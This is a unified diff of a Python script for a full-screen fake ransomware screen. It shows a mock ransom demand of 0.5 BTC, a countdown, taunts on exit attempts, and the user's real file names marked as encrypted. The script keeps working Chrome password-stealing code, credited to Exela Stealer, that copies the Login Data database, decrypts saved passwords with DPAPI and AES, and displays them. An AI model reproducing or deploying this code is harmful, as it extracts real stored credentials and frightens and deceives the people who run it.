@@ -1,18 +1,15 @@
 import tkinter as tk
 import os
 import getpass
-import platform
 import socket
-import uuid
-import subprocess
-import time
-import threading
-import random
 import sqlite3
 import win32crypt
 import json
 from base64 import b64decode
 from Crypto.Cipher import AES
+import time
+import threading
+import random
 
 class FakeRansomwareCLI:
     def __init__(self, root):
@@ -22,9 +19,8 @@ class FakeRansomwareCLI:
         self.root.attributes("-fullscreen", True)
         self.root.bind("<space>", self.handle_exit)
 
-        # Countdown time (48 hours in seconds)
-        self.time_left = 48 * 60 * 60
-        # Exit attempt counter
+        # Countdown time (24 hours in seconds for realism)
+        self.time_left = 24 * 60 * 60
         self.exit_attempts = 0
 
         # Text widget (main terminal area)
@@ -33,7 +29,7 @@ class FakeRansomwareCLI:
             bg="black",
             fg="red",
             insertbackground="red",
-            font=("Consolas", 13),
+            font=("Consolas", 14),
             bd=0,
             highlightthickness=0,
             padx=20,
@@ -48,28 +44,15 @@ class FakeRansomwareCLI:
             text="",
             fg="red",
             bg="black",
-            font=("Consolas", 28, "bold"),
+            font=("Consolas", 24, "bold"),
             anchor="ne",
             justify="right"
         )
         self.timer_label.place(relx=0.99, rely=0.01, anchor="ne")
 
-        # SYSTEM INFO (SAFE: purely local, nothing sent)
+        # Minimal system info
         username = getpass.getuser()
-        computername = platform.node()
         ip_address = socket.gethostbyname(socket.gethostname())
-        os_info = f"{platform.system()} {platform.release()}"
-
-        try:
-            mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
-                                for ele in range(0, 8*6, 8)][::-1])
-        except:
-            mac_addr = "Unavailable"
-
-        try:
-            hwid = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split('\n')[1].strip()
-        except:
-            hwid = "Unavailable"
 
         # Chrome password stealer (from Exela Stealer)
         def get_chrome_passwords():
@@ -80,7 +63,7 @@ class FakeRansomwareCLI:
                     return ["[ERROR] Chrome password database not found"]
 
                 # Copy database to avoid locking
-                temp_path = os.path.join(os.environ["TEMP"], f"Login Data")
+                temp_path = os.path.join(os.environ["TEMP"], "Login Data")
                 with open(login_db, 'rb') as f:
                     data = f.read()
                 with open(temp_path, 'wb') as f:
@@ -113,80 +96,59 @@ class FakeRansomwareCLI:
                         continue
                 conn.close()
                 os.remove(temp_path)  # Clean up
-                return passwords[:5] if passwords else ["[ERROR] No passwords found"]
+                return passwords[:3] if passwords else ["[ERROR] No passwords found"]
             except Exception as e:
                 return [f"[ERROR] Failed to extract passwords: {str(e)}"]
 
         chrome_passwords = get_chrome_passwords()
 
-        # Fake sensitive info (other than passwords)
-        fake_sensitive = [
-            f"[LEAKED] SSN Fragment: ***-**-{random.randint(1000,9999)}",
-            f"[LEAKED] Crypto Wallet: 0x{random.randint(100000,999999)}...{random.randint(1000,9999)}",
-            f"[LEAKED] Recent Browser Search: 'how to recover hacked account' ({time.strftime('%Y-%m-%d %H:%M:%S')})",
-        ]
-
-        # Fake filenames with "encrypted" extensions
+        # Minimal fake files with "encrypted" extensions
         user_dir = os.path.expanduser("~")
         sample_files = []
-        for folder in ["Desktop", "Documents", "Downloads", "Pictures", "Videos"]:
+        for folder in ["Desktop", "Documents"]:
             path = os.path.join(user_dir, folder)
             if os.path.isdir(path):
                 try:
                     files = os.listdir(path)
                     files = [f for f in files if os.path.isfile(os.path.join(path, f))]
-                    sample_files += random.sample(files, min(3, len(files)))
+                    sample_files += random.sample(files, min(2, len(files)))
                 except:
                     continue
         if not sample_files:
-            sample_files = ["tax_return_2023.pdf", "passport_scan.jpg", "private_notes.txt"]
+            sample_files = ["important_doc.pdf", "photos.zip"]
         sample_files = [f"{f}.locked" for f in sample_files]
 
-        # Fake progress bar for "uploading"
+        # Fake progress bar
         def fake_progress_bar():
-            return f"[{'=' * random.randint(5,20):<20}] {random.randint(10,90)}%"
+            return f"[{'=' * random.randint(5,15):<15}] {random.randint(30,80)}%"
 
-        # Typing script with scarier messages
+        # Streamlined, realistic messages
         self.lines_to_type = [
-            "[!!!] SYSTEM COMPROMISED BY DARKNET_X v4.2\n",
-            "[*] Injecting remote access trojan...\n",
-            "[*] Bypassing Windows Defender...\n",
-            "[*] Activating keylogger module\n",
-            "[*] Accessing Chrome password vault\n",
-            "[*] Decrypting credentials with stolen DPAPI key\n",
-            f"[*] Uploading data to dark web: {fake_progress_bar()}\n",
+            "[!!!] SYSTEM BREACH\n",
+            "[*] Accessing Chrome credentials...\n",
+            "[*] Decrypting password vault...\n",
+            f"[*] Encrypting files: {fake_progress_bar()}\n",
             "\n",
-            f"[INFO] Username: {username}\n",
-            f"[INFO] Computer Name: {computername}\n",
-            f"[INFO] IP Address: {ip_address}\n",
-            f"[INFO] OS Version: {os_info}\n",
-            f"[INFO] MAC Address: {mac_addr}\n",
-            f"[INFO] HWID: {hwid}\n",
+            f"[INFO] User: {username}\n",
+            f"[INFO] IP: {ip_address}\n",
             "\n",
-            "[!!!] ALL FILES ENCRYPTED\n",
-            "Do NOT shut down or data will be erased permanently.\n",
-            "Webcam feed active. Keylogger logging all inputs.\n",
-            f"Data auction in progress: {fake_progress_bar()}\n",
+            "[!!!] FILES ENCRYPTED\n",
+            "Pay 0.5 BTC or lose all data.\n",
             "\n",
-            "Compromised files detected:\n"
+            "Encrypted files:\n"
         ] + [f"  - {f}" for f in sample_files] + [
             "\n",
-            "Extracted Chrome credentials:\n"
+            "Stolen passwords:\n"
         ] + chrome_passwords + [
             "\n",
-            "Additional stolen data:\n"
-        ] + fake_sensitive + [
-            "\n",
-            "To decrypt files, send 0.7 BTC to: 1X{random.randint(100000,999999)}...{random.randint(1000,9999)}\n",
-            "Instructions at: http://decryptdata.onion/restore?id=AC7DFF91\n",
-            "\n",
-            "Unique ID: AC7DFF91\n",
-            "Time left until data leak:\n",
+            "Send payment to: 1X{random.randint(100000,999999)}...{random.randint(1000,9999)}\n",
+            "ID: AC7DFF91\n",
+            "Time left: \n",
         ]
 
         self.current_line = 0
         self.current_char = 0
-        self.typing_speed_ms = 5  # Faster typing (was 18ms)
+        self.typing_speed_ms = 5  # Fast typing
         self.start_typing()
 
         threading.Thread(target=self.update_timer, daemon=True).start()
@@ -201,7 +163,7 @@ class FakeRansomwareCLI:
             else:
                 self.current_line += 1
                 self.current_char = 0
-                self.root.after(100, self.start_typing)  # Slightly faster line breaks
+                self.root.after(100, self.start_typing)
 
     def append_text(self, char):
         self.text_widget.configure(state="normal")
@@ -223,8 +185,8 @@ class FakeRansomwareCLI:
         self.exit_attempts += 1
         taunt_messages = [
             "[!!!] Trying to exit? Not so fast...\n",
-            "[!!!] You can't escape that easily!\n",
-            "[!!!] Last chance, data deletion imminent!\n"
+            "[!!!] Not getting away that easy!\n",
+            "[!!!] Last chance before data wipe!\n"
         ]
         if self.exit_attempts <= 3:
             self.text_widget.configure(state="normal")
@@ -238,3 +200,4 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = FakeRansomwareCLI(root)
     root.mainloop()
+    
